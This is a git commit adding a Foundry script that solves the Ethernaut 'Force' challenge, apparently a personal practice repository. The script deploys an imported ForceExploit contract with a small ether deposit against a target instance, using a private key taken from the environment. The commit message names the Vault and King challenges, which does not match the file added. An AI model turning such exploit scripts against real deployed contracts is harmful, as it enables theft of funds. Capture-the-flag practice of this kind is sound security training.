d13a5870f2f02fb92a8f9d2fd879a0b356d5cc43
0xMilenov <137901924+0xMilenov@users.noreply.github.com>
2023-09-30 05:07:38 +0300

    Solved Vault and King Ethernaut challenges

---
+++ script/07/Force.s.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+// 0xMilenov's solution to ethernaut
+
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import {ForceExploit} from "src/07/ForceExploit.sol";
+
+contract Exploit is Script {
+    ForceExploit exploit;
+    address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));
+    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
+    uint256 immutable initialDeposit = 0.0005 ether;
+
+    function run() external {
+        vm.startBroadcast(hacker);
+        exploit = new ForceExploit{value: initialDeposit}(instance);
+        vm.stopBroadcast();
+    }
+}
